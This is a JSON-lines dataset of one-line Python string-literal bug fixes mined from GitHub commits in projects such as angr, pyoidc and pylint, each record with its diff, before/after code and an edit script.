{"project": "WhatTodo", "commit_sha": "a5146f06e420ed1b1b9987e6a2cb655fc5db2949", "parent_sha": "5c5c989a4b02c3a0cf10fcc598942a9d8a524455", "file_path": "what_todo.py", "project_url": "https://github.com/FMCorz/WhatTodo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class WhatTodo(object):\n \t\tfn = self.view.file_name() or 'Unsaved document'\n \t\tv.insert(e, v.size(), '%s\\n\\n' % fn)\n \t\tfor (linenb, todo) in todos:\n-\t\t\ts = \"{0:>5}:\\t{1}\\n\".format(linenb, todo)\n+\t\t\ts = u\"{0:>5}:\\t{1}\\n\".format(linenb, todo)\n \t\t\tv.insert(e, v.size(), s)\n \t\tv.end_edit(e)\n \n", "before": "s = \"{0:>5}:\\t{1}\\n\" . format ( linenb , todo )", "after": "s = u\"{0:>5}:\\t{1}\\n\" . format ( linenb , todo )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"{0:>5}:\\\\t{1}\\\\n\\\"\", 3, 8, 3, 24], \"u\\\"{0:>5}:\\\\t{1}\\\\n\\\"\"]]"}
{"project": "pylint", "commit_sha": "14cc8ada1344f68c00135751321754c6cda07054", "parent_sha": "fee62650901a2f444ee7c1537f411f355dfa5dbe", "file_path": "setup.py", "project_url": "https://github.com/wubob/pylint", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ class MyInstallLib(install_lib.install_lib):\n                 dest = join(self.install_dir, base, directory)\n                 if sys.version_info >= (3, 0):\n                     exclude = set(['invalid_encoded_data*',\n-                                   'unkown_encoding*'])\n+                                   'unknown_encoding*'])\n                 else:\n                     exclude = set()\n                 shutil.rmtree(dest, ignore_errors=True)\n", "before": "exclude = set ( [ 'invalid_encoded_data*' , 'unkown_encoding*' ] )", "after": "exclude = set ( [ 'invalid_encoded_data*' , 'unknown_encoding*' ] )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'unkown_encoding*'\", 3, 36, 3, 54], \"'unknown_encoding*'\"]]"}
{"project": "tensorflow-extenteten", "commit_sha": "c86d8d6122a6c0085f3b5d52b2287d6fc74d0cbf", "parent_sha": "46f66b5ddae59ead69603522ebf5c6aa7585d9a8", "file_path": "nn/main.py", "project_url": "https://github.com/raviqqe/tensorflow-extenteten", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def main(model_class):\n           values = sess.run([*model.debug_values.values()])\n \n           for name, value in zip(model.debug_values.keys(), values):\n-            print(\"DEBUG_VALUE: {}:\".format(name), value)\n+            print(\"DEBUG_VALUE: {} =\".format(name), value)\n \n         start_time = time.time()\n         results = sess.run([model.train_op, train.global_step(), batch_size,\n", "before": "print ( \"DEBUG_VALUE: {}:\" . format ( name ) , value )", "after": "print ( \"DEBUG_VALUE: {} =\" . format ( name ) , value )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"DEBUG_VALUE: {}:\\\"\", 3, 19, 3, 37], \"\\\"DEBUG_VALUE: {} =\\\"\"]]"}
{"project": "eniric", "commit_sha": "5d28a3539846d1a128028d1df1f595261fcd9009", "parent_sha": "714820b59eb54c7c8119b252f67ba8e55d3b981b", "file_path": "eniric_scripts/prec_1.py", "project_url": "https://github.com/jason-neal/eniric", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def calc_prec1(star, band, vel, resolution, smpl, normalize=True):\n         norm_id = \"\"\n     print(star, band, vel, resolution, smpl, norm_)\n     print(type(star), type(band), type(vel), type(resolution), type(smpl), type(norm_))\n-    file_to_read = (\"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:d}.txt\"\n+    file_to_read = (\"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:s}.txt\"\n                     \"\").format(star, band, vel, resolution, smpl, norm_)\n \n     # sample was left aside because only one value existed\n", "before": "file_to_read = ( \"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:d}.txt\" \"\" ) . format ( star , band , vel , resolution , smpl , norm_ )", "after": "file_to_read = ( \"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:s}.txt\" \"\" ) . format ( star , band , vel , resolution , smpl , norm_ )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:d}.txt\\\"\", 3, 21, 3, 99], \"\\\"Spectrum_{0:s}-PHOENIX-ACES_{1:s}band_vsini{2:.01f}_R{3:s}{5:s}_res{4:s}.txt\\\"\"]]"}
{"project": "yellowpagist", "commit_sha": "882c03c2c359a3b25feabf9f2191958b52995558", "parent_sha": "2916311e2f64c1f53d51cee68c5918a6e53e2a25", "file_path": "gmaps.py", "project_url": "https://github.com/SkullTech/yellowpagist", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class GMaps:\n \n     @staticmethod\n     def getAPIKey():\n-        if 'YPAPIKey' in os.environ:\n+        if 'GoogleAPIKey' in os.environ:\n             APIKey = os.environ['GoogleAPIKey']\n         else:    \n             with open('creds.yaml') as file:\n", "before": "if 'YPAPIKey' in os . environ : APIKey = os . environ [ 'GoogleAPIKey' ] else : with open ( 'creds.yaml' ) as file : ", "after": "if 'GoogleAPIKey' in os . environ : APIKey = os . environ [ 'GoogleAPIKey' ] else : with open ( 'creds.yaml' ) as file : ", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'YPAPIKey'\", 3, 12, 3, 22], \"'GoogleAPIKey'\"]]"}
{"project": "pylint", "commit_sha": "a341446ffdfb6135f8d9b35c5461c26a18230fe2", "parent_sha": "8f7f469c2c53eddfd550a6018471e1a0c7e7604a", "file_path": "test/test_regr.py", "project_url": "https://github.com/wubob/pylint", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ class NonRegrTC(TestCase):\n     def test_absolute_import(self):\n         linter.check(join(REGR_DATA, 'absimp', 'string.py'))\n         got = linter.reporter.finalize().strip()\n-        self.assertEqual(got, \"W:  6: Uses of a deprecated module 'string'\")\n+        self.assertEqual(got, \"\")\n \n if __name__ == '__main__':\n     unittest_main()\n", "before": "self . assertEqual ( got , \"W:  6: Uses of a deprecated module 'string'\" )", "after": "self . assertEqual ( got , \"\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"W:  6: Uses of a deprecated module 'string'\\\"\", 3, 31, 3, 76], \"\\\"\\\"\"]]"}
{"project": "angr", "commit_sha": "b1843f4389875925951f24f6bdc897a5ff212770", "parent_sha": "97db5d7adad286c7c4e4dd65a39fb06e09595458", "file_path": "angr/analyses/cfg_base.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -341,7 +341,7 @@ class CFGBase(Analysis):\n         \"\"\"\n         raise DeprecationWarning('\"get_any_irsb()\" is deprecated since SimIRSB does not exist anymore.')\n \n-    def get_all_nodes(self, addr, is_syscall=None, anyaddr=True):\n+    def get_all_nodes(self, addr, is_syscall=None, anyaddr=False):\n         \"\"\"\n         Get all CFGNodes whose address is the specified one.\n \n", "before": "\"\"\"\n         raise DeprecationWarning('\"get_any_irsb()\" is deprecated since SimIRSB does not exist anymore.')\n \n     def get_all_nodes(self, addr, is_syscall=None, anyaddr=True):\n         \"\"\"", "after": "\"\"\"\n         raise DeprecationWarning('\"get_any_irsb()\" is deprecated since SimIRSB does not exist anymore.')\n \n     def get_all_nodes(self, addr, is_syscall=None, anyaddr=False):\n         \"\"\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"\\\"\\\"\\n         raise DeprecationWarning('\\\"get_any_irsb()\\\" is deprecated since SimIRSB does not exist anymore.')\\n \\n     def get_all_nodes(self, addr, is_syscall=None, anyaddr=True):\\n         \\\"\\\"\\\"\", 0, 9, 4, 12], \"\\\"\\\"\\\"\\n         raise DeprecationWarning('\\\"get_any_irsb()\\\" is deprecated since SimIRSB does not exist anymore.')\\n \\n     def get_all_nodes(self, addr, is_syscall=None, anyaddr=False):\\n         \\\"\\\"\\\"\"]]"}
{"project": "angr", "commit_sha": "ee4bb3bf932d82ffd313b3c1d6bba6a9761e0d6a", "parent_sha": "106f9bde952a4f1e5220f12067a1cc71c8d75aaf", "file_path": "simuvex/vex/ccall.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -543,7 +543,7 @@ def pc_calculate_condition(state, cond, cc_op, cc_dep1, cc_dep2, cc_ndep, platfo\n             zf = state.se.LShR(rdata, data[platform]['CondBitOffsets']['G_CC_SHIFT_Z'])\n             return 1 & (inv ^ zf), []\n \n-        if v in [data[platform]['CondTypes']['CondB'], data[platform]['CondBitOffsets']['CondNB']]:\n+        if v in [data[platform]['CondTypes']['CondB'], data[platform]['CondTypes']['CondNB']]:\n             l.debug(\"CondB\")\n             cf = state.se.LShR(rdata, data[platform]['CondBitOffsets']['G_CC_SHIFT_C'])\n             return 1 & (inv ^ cf), []\n", "before": "if v in [ data [ platform ] [ 'CondTypes' ] [ 'CondB' ] , data [ platform ] [ 'CondBitOffsets' ] [ 'CondNB' ] ] : l . debug ( \"CondB\" ) cf = state . se . LShR ( rdata , data [ platform ] [ 'CondBitOffsets' ] [ 'G_CC_SHIFT_C' ] ) return 1 & ( inv ^ cf ) , [ ]", "after": "if v in [ data [ platform ] [ 'CondTypes' ] [ 'CondB' ] , data [ platform ] [ 'CondTypes' ] [ 'CondNB' ] ] : l . debug ( \"CondB\" ) cf = state . se . LShR ( rdata , data [ platform ] [ 'CondBitOffsets' ] [ 'G_CC_SHIFT_C' ] ) return 1 & ( inv ^ cf ) , [ ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'CondBitOffsets'\", 3, 71, 3, 87], \"'CondTypes'\"]]"}
{"project": "angr", "commit_sha": "88284637cf00b7e5d877f8e5cd30d03144f30e17", "parent_sha": "8ce56bd49438d521c1a333d8b8ac29977591c425", "file_path": "angr/analyses/cdg.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ class CDG(Analysis):\n         self._cdg = None\n         self._label = None\n         # Debugging purpose\n-        if hasattr(self._cfg, \"get_irsb\"):\n+        if hasattr(self._cfg, \"get_node\"):\n             # FIXME: We should not use get_any_irsb in such a real setting...\n             self._entry = self._cfg.get_any_node(self._p.entry)\n \n", "before": "if hasattr ( self . _cfg , \"get_irsb\" ) : self . _entry = self . _cfg . get_any_node ( self . _p . entry )", "after": "if hasattr ( self . _cfg , \"get_node\" ) : self . _entry = self . _cfg . get_any_node ( self . _p . entry )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"get_irsb\\\"\", 3, 31, 3, 41], \"\\\"get_node\\\"\"]]"}
{"project": "angr", "commit_sha": "65c36656a6e0a661e95c6c33c71f7765e87da6cb", "parent_sha": "a6cce1942e2180c461451e1d49933c8a15d8ffd2", "file_path": "tests/test_sprintf.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ import os\n test_location = str(os.path.dirname(os.path.realpath(__file__)))\n \n def test_sprintf():\n-    p = angr.Project(os.path.join(test_location, \"build/x86_64/sprintf_test\"))\n+    p = angr.Project(os.path.join(test_location, \"../../binaries/tests/x86_64/sprintf_test\"))\n     a = p.surveyors.Explorer(find=0x4005c0)\n     a.run()\n     state = a.found[0].state\n", "before": "p = angr . Project ( os . path . join ( test_location , \"build/x86_64/sprintf_test\" ) )", "after": "p = angr . Project ( os . path . join ( test_location , \"../../binaries/tests/x86_64/sprintf_test\" ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"build/x86_64/sprintf_test\\\"\", 3, 50, 3, 77], \"\\\"../../binaries/tests/x86_64/sprintf_test\\\"\"]]"}
{"project": "angr", "commit_sha": "7ff98329fa5f1c2d21f7010c012c4b33b290e6d3", "parent_sha": "a1f8725b07c0814c482d75357651af1c760bdd9d", "file_path": "simuvex/procedures/libc___so___6/strchr.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class strchr(simuvex.SimProcedure):\n             max_sym = min(self.state.se.max_int(s_strlen.ret_expr), self.state.libc.max_symbolic_strchr)\n             a, c, i = self.state.memory.find(s_addr, c, s_strlen.max_null_index, max_symbolic_bytes=max_sym, default=0)\n         else:\n-            l.debug(\"symbolic strlen\")\n+            l.debug(\"concrete strlen\")\n             max_search = self.state.se.any_int(s_strlen.ret_expr)\n             a, c, i = self.state.memory.find(s_addr, c, max_search, default=0)\n \n", "before": "else : l . debug ( \"symbolic strlen\" )", "after": "else : l . debug ( \"concrete strlen\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"symbolic strlen\\\"\", 3, 21, 3, 38], \"\\\"concrete strlen\\\"\"]]"}
{"project": "metaaldetectievondstmeldingen-dev", "commit_sha": "5c2a74a9489879f4716da641c0a9b704037ebdde", "parent_sha": "878cd2406b121c3dfcb7c9cecd34772e4c8c319e", "file_path": "migrate_dbs.py", "project_url": "https://github.com/cecemel/metaaldetectievondstmeldingen-dev", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def start_db():\n     except:\n         print(\"issue cleaning docker images, let's proceed and see...\")\n \n-    _exec_command(\"docker run -p '5432:5432' --name {} -v {}:/var/lib/postgresql/data {} &\".format(DATABASE_CONTAINER_NAME,\n+    _exec_command(\"docker run -p 5432:5432 --name {} -v {}:/var/lib/postgresql/data {} &\".format(DATABASE_CONTAINER_NAME,\n                                                                         DATABASE_DATA,\n                                                                         DATABASE_IMAGE))\n     print(\"wait for migration db to boot (10 secs)\")\n", "before": "_exec_command ( \"docker run -p '5432:5432' --name {} -v {}:/var/lib/postgresql/data {} &\" . format ( DATABASE_CONTAINER_NAME , DATABASE_DATA , DATABASE_IMAGE ) )", "after": "_exec_command ( \"docker run -p 5432:5432 --name {} -v {}:/var/lib/postgresql/data {} &\" . format ( DATABASE_CONTAINER_NAME , DATABASE_DATA , DATABASE_IMAGE ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"docker run -p '5432:5432' --name {} -v {}:/var/lib/postgresql/data {} &\\\"\", 3, 19, 3, 92], \"\\\"docker run -p 5432:5432 --name {} -v {}:/var/lib/postgresql/data {} &\\\"\"]]"}
{"project": "smartladder", "commit_sha": "81f4a93f6bd73a6ca9d8d6585b224f794e1dd92b", "parent_sha": "a98091a979b8fcf503f07c9e7c1f09be640d2e82", "file_path": "goagent+/proxy.py", "project_url": "https://github.com/bannedbook/smartladder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ def get_appids():\n     b\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\",\n     b\"nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM\"\n     )\n-    f = urllib.request.urlopen(url=\"http://idupd.sdapp.cn/v\").read().translate(fly)\n+    f = urllib.request.urlopen(url=\"http://lovejiani.com/v\").read().translate(fly)\n     d = base64.b64decode(f)\n     e = str(d, encoding='ascii').split('\\r\\n')\n     random.shuffle(e)\n", "before": "f = urllib . request . urlopen ( url = \"http://idupd.sdapp.cn/v\" ) . read ( ) . translate ( fly )", "after": "f = urllib . request . urlopen ( url = \"http://lovejiani.com/v\" ) . read ( ) . translate ( fly )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"http://idupd.sdapp.cn/v\\\"\", 3, 36, 3, 61], \"\\\"http://lovejiani.com/v\\\"\"]]"}
{"project": "angr", "commit_sha": "3da03f313e76a828eda08e8a4264f3e69d914507", "parent_sha": "eadfb4834111406c6573d30191eb0edafed01519", "file_path": "angr/analyses/cfg_base.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ class CFGBase(Analysis):\n \n-        if excluding_fakeret and jumpkind == 'Ijk_Ret':\n+        if excluding_fakeret and jumpkind == 'Ijk_FakeRet':\n             return [ ]\n \n         if not excluding_fakeret and jumpkind is None:\n", "before": "if excluding_fakeret and jumpkind == 'Ijk_Ret' : return [ ]", "after": "if excluding_fakeret and jumpkind == 'Ijk_FakeRet' : return [ ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Ijk_Ret'\", 1, 46, 1, 55], \"'Ijk_FakeRet'\"]]"}
{"project": "angr", "commit_sha": "92fa0699fc1673b76e0878dcce86bd9fd006c0c9", "parent_sha": "676f27c6dd2dcb2695089d07baf5b124bdc45616", "file_path": "angr/factory.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class AngrObjectFactory(object):\n             raise AngrExitError(\"Cannot create run following jumpkind %s\" % jumpkind)\n \n         if jumpkind == \"Ijk_NoDecode\" and not self._project.is_hooked(addr):\n-            raise AngrExitError(\"IR decoding error at #%x. You can hook this instruction with a python replacement \"\n+            raise AngrExitError(\"IR decoding error at %#x. You can hook this instruction with a python replacement \"\n                                 \"using project.hook(%#x, your_function, length=length_of_instruction).\" % (addr, addr))\n \n         elif self._project.is_hooked(addr) and jumpkind != 'Ijk_NoHook':\n", "before": "raise AngrExitError ( \"IR decoding error at #%x. You can hook this instruction with a python replacement \" \"using project.hook(%#x, your_function, length=length_of_instruction).\" % ( addr , addr ) )", "after": "raise AngrExitError ( \"IR decoding error at %#x. You can hook this instruction with a python replacement \" \"using project.hook(%#x, your_function, length=length_of_instruction).\" % ( addr , addr ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"IR decoding error at #%x. You can hook this instruction with a python replacement \\\"\", 3, 33, 3, 117], \"\\\"IR decoding error at %#x. You can hook this instruction with a python replacement \\\"\"]]"}
{"project": "angr", "commit_sha": "bc8f1b2ce6ecba3fad4c01391c15014a3362e713", "parent_sha": "2a1f2be475fb8e4978f9072b9cd2451af1e7a831", "file_path": "angr/analyses/cfg_accurate.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1382,7 +1382,7 @@ class CFGAccurate(ForwardAnalysis, CFGBase):    # pylint: disable=abstract-metho\n         function_name = self.project.loader.find_symbol_name(simrun.addr)\n         module_name = self.project.loader.find_module_name(simrun.addr)\n \n-        l.debug(\"Basic block %s(%d) %s\", simrun, self.get_node(entry.simrun_key).depth,\n+        l.debug(\"Basic block %s(%s) %s\", simrun, self.get_node(entry.simrun_key).depth,\n                 \"->\".join([hex(i) for i in call_stack_suffix if i is not None])\n                 )\n         l.debug(\"(Function %s of binary %s)\", function_name, module_name)\n", "before": "l . debug ( \"Basic block %s(%d) %s\" , simrun , self . get_node ( entry . simrun_key ) . depth , \"->\" . join ( [ hex ( i ) for i in call_stack_suffix if i is not None ] ) )", "after": "l . debug ( \"Basic block %s(%s) %s\" , simrun , self . get_node ( entry . simrun_key ) . depth , \"->\" . join ( [ hex ( i ) for i in call_stack_suffix if i is not None ] ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Basic block %s(%d) %s\\\"\", 3, 17, 3, 40], \"\\\"Basic block %s(%s) %s\\\"\"]]"}
{"project": "angr", "commit_sha": "e5cc8339c4e5b0a0f6d8ef91a85b80e19e3af084", "parent_sha": "b00ba28575c66a6ad214bd3f266330b7f1382561", "file_path": "simuvex/s_arch.py", "project_url": "https://github.com/grimm-co/angr", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ class SimARM(SimArch):\n \t\t\tself.nop_instruction = self.nop_instruction[::-1]\n \n class SimMIPS32(SimArch):\n-\tdef __init__(self, endness=\"Iend_BE\"):\n+\tdef __init__(self, endness=\"Iend_LE\"):\n \t\t# TODO: multiple return registers?\n \t\t# TODO: which endianness?\n \t\tSimArch.__init__(self)\n", "before": "def __init__ ( self , endness = \"Iend_BE\" ) : SimArch . __init__ ( self )", "after": "def __init__ ( self , endness = \"Iend_LE\" ) : SimArch . __init__ ( self )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Iend_BE\\\"\", 3, 29, 3, 38], \"\\\"Iend_LE\\\"\"]]"}
{"project": "Browbeat-ML", "commit_sha": "b5f5ba5ea1628ee7629e9f2fb720b735b884b77b", "parent_sha": "b1d8796fa4214bf1c76bfcad1eb36abc17abb8a3", "file_path": "bml/lib/dtree_classifier.py", "project_url": "https://github.com/redhat-performance/Browbeat-ML", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ def classify_value(config, value, test_name, osp_version):\n     predictors[1] = test_name_dic[str(test_name)]\n     predictors[2] = float(value)\n     predictors.reshape(1, -1)\n-    with open('lib/classifier/dumped_dtree.pkl', 'rb') as fid:\n+    with open('classifier/dumped_dtree.pkl', 'rb') as fid:\n         clf = cPickle.load(fid)\n     output_prediction = clf.predict([predictors])\n     return output_prediction\n", "before": "with open ( 'lib/classifier/dumped_dtree.pkl' , 'rb' ) as fid : clf = cPickle . load ( fid )", "after": "with open ( 'classifier/dumped_dtree.pkl' , 'rb' ) as fid : clf = cPickle . load ( fid )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'lib/classifier/dumped_dtree.pkl'\", 3, 15, 3, 48], \"'classifier/dumped_dtree.pkl'\"]]"}
{"project": "pyoidc", "commit_sha": "77aaf8e00c7fe757fd0b8195dd3793ca37274c67", "parent_sha": "5e8d880c00716db1c7c254bb84c39cca1db5ac01", "file_path": "src/oic/oauth2/message.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -617,7 +617,7 @@ class Message(MutableMapping):\n                     key.extend(keyjar.get_verify_key(owner=kwargs[\"sender\"]))\n \n                 logger.debug(\"Raw JSON: {}\".format(sanitize(jso)))\n-                logger.debug(\"header: {}\".format(sanitize(_header)))\n+                logger.debug(\"JWS header: {}\".format(sanitize(_header)))\n                 if _header[\"alg\"] == \"none\":\n                     pass\n                 elif verify:\n", "before": "logger . debug ( \"header: {}\" . format ( sanitize ( _header ) ) )", "after": "logger . debug ( \"JWS header: {}\" . format ( sanitize ( _header ) ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"header: {}\\\"\", 3, 30, 3, 42], \"\\\"JWS header: {}\\\"\"]]"}
{"project": "pyoidc", "commit_sha": "ec256fccecd9bcb66b950c3e7c8e30df871a0643", "parent_sha": "aedd78195f4d2d28a5f4a9007e996b091800ac78", "file_path": "tests/test_oic_provider.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -475,7 +475,7 @@ class TestProvider(object):\n \n         resp = self.provider.token_endpoint(request=txt)\n         atr = TokenErrorResponse().deserialize(resp.message, \"json\")\n-        assert atr['error'] == \"access_denied\"\n+        assert atr['error'] == \"invalid_request\"\n \n     def test_token_endpoint_unauth(self):\n         state = 'state'\n", "before": "assert atr [ 'error' ] == \"access_denied\"", "after": "assert atr [ 'error' ] == \"invalid_request\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"access_denied\\\"\", 3, 32, 3, 47], \"\\\"invalid_request\\\"\"]]"}
{"project": "pyoidc", "commit_sha": "3699643ac03b365a47ca74642afd03a23fbd6a61", "parent_sha": "91b3ed14e1cd88c78e4e4515dd2bd9f766734c9a", "file_path": "src/oic/oic/__init__.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -579,7 +579,7 @@ class Client(oauth2.Client):\n                                 method=\"POST\", request_args=None,\n                                 extra_args=None, http_args=None,\n                                 response_cls=AccessTokenResponse,\n-                                authn_method=\"\", **kwargs):\n+                                authn_method=\"client_secret_basic\", **kwargs):\n \n         return oauth2.Client.do_access_token_request(self, request, scope,\n                                                      state, body_type, method,\n", "before": "authn_method = \"\" , ** kwargs", "after": "authn_method = \"client_secret_basic\" , ** kwargs", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"\\\"\", 3, 46, 3, 48], \"\\\"client_secret_basic\\\"\"]]"}
{"project": "pyoidc", "commit_sha": "a1e4b8b4a66e2278082e4188f22c8867eead2b83", "parent_sha": "f2fbc440eaf229efc3df4962db973da78e8aa4e2", "file_path": "src/oic/extension/provider.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -532,7 +532,7 @@ class Provider(provider.Provider):\n         authzreq = json.loads(_info['authzreq'])\n         issue_refresh = False\n         if 'scope' in authzreq and 'offline_access' in authzreq['scope']:\n-            if authzreq['return_type'] == 'code':\n+            if authzreq['response_type'] == 'code':\n                 issue_refresh = True\n \n         try:\n", "before": "if authzreq [ 'return_type' ] == 'code' : issue_refresh = True", "after": "if authzreq [ 'response_type' ] == 'code' : issue_refresh = True", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'return_type'\", 3, 25, 3, 38], \"'response_type'\"]]"}
{"project": "pyoidc", "commit_sha": "12240fe5f0dff92390aaf8e1768534ad816cb58f", "parent_sha": "080b3d1661901bec41cfd712d93bea8cd0debed1", "file_path": "src/oic/oic/__init__.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1072,7 +1072,7 @@ class Client(oauth2.Client):\n         self.registration_response = reginfo\n         if \"token_endpoint_auth_method\" not in self.registration_response:\n             self.registration_response[\n-                \"token_endpoint_auth_method\"] = \"client_secret_post\"\n+                \"token_endpoint_auth_method\"] = \"client_secret_basic\"\n         self.client_id = reginfo[\"client_id\"]\n         try:\n             self.client_secret = reginfo[\"client_secret\"]\n", "before": "self . registration_response [ \"token_endpoint_auth_method\" ] = \"client_secret_post\"", "after": "self . registration_response [ \"token_endpoint_auth_method\" ] = \"client_secret_basic\"", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"client_secret_post\\\"\", 3, 49, 3, 69], \"\\\"client_secret_basic\\\"\"]]"}
{"project": "pyoidc", "commit_sha": "c23911c69653a346ca0a2d3e0ad01a209ef37206", "parent_sha": "0a159968254fefc3abe8005b840e82cfc6b3de22", "file_path": "src/oic/oic/provider.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1378,7 +1378,7 @@ class Provider(AProvider):\n                         \"Http redirect_uri must use localhost\")\n             elif must_https and p.scheme != \"https\":\n                 raise InvalidRedirectURIError(\n-                    \"Non-https redirect_uri not allowed\")\n+                    \"None https redirect_uri not allowed\")\n             elif p.fragment:\n                 raise InvalidRedirectURIError(\n                     \"redirect_uri contains fragment\")\n", "before": "raise InvalidRedirectURIError ( \"Non-https redirect_uri not allowed\" )", "after": "raise InvalidRedirectURIError ( \"None https redirect_uri not allowed\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"Non-https redirect_uri not allowed\\\"\", 3, 21, 3, 57], \"\\\"None https redirect_uri not allowed\\\"\"]]"}
{"project": "pyoidc", "commit_sha": "8aa6fb9cc97b46448210a3b4ba5d86f971897f62", "parent_sha": "06f37a187645a4a8fc14fd3e92cac44fb1f9e776", "file_path": "src/oic/oic/provider.py", "project_url": "https://github.com/qaavi/pyoidc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -926,7 +926,7 @@ class Provider(AProvider):\n                                    descr=\"redirect_uri mismatch\")\n             except KeyError:\n                 return self._error(error='invalid_request',\n-                                   descr='Missing code')\n+                                   descr='Missing redirect_uri')\n \n         _log_debug(\"All checks OK\")\n \n", "before": "descr = \"redirect_uri mismatch\" ) except KeyError : return self . _error ( error = 'invalid_request' , descr = 'Missing code' )", "after": "descr = \"redirect_uri mismatch\" ) except KeyError : return self . _error ( error = 'invalid_request' , descr = 'Missing redirect_uri' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Missing code'\", 3, 42, 3, 56], \"'Missing redirect_uri'\"]]"}
